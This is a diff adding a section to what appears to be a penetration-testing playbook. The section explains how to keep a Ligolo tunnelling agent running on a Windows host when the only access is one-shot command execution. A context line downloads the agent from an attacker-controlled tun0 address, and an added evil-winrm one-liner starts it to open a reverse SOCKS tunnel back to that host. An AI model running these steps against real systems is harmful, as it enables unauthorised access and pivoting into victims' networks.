@@ -137,6 +137,24 @@ powershell -c "iwr http://<tun0-ip>:8000/ligolo-agent.exe -OutFile $env:TEMP\a.e
 Track every uploaded agent in the ledger's artifacts list — they are the first
 thing cleanup removes.
 
+**Keeping the agent alive when your foothold is a *one-shot* exec.** A command
+runner that opens a fresh session per call (`nxc winrm -X`, a single piped
+`evil-winrm` command, most `*_exec.py`) kills the process it spawned when that
+session tears down, so a long-running agent started that way dies the moment the
+call returns. For an *unprivileged* user the usual detach tricks also fail —
+`Start-Process`/`Invoke-Item` are still session children, WMI
+`Win32_Process.Create` is often *access denied*, and a scheduled task won't start
+without the "Log on as batch job" right. The reliable pattern is to **hold one
+interactive session open and let the blocking agent occupy it**: pipe the agent's
+(blocking) command line into an interactive `evil-winrm` and run *that* as a
+background task — the session stays connected for as long as the agent runs, so
+the tunnel stays up.
+
+```bash
+printf 'C:\\Windows\\Temp\\a.exe client <tun0-ip>:8000 R:socks\n' | \
+  evil-winrm -i $T -u <u> -p <p>      # launch as a background task; it holds the tunnel
+```
+
 ## Using a SOCKS proxy when you must
 
 ```bash
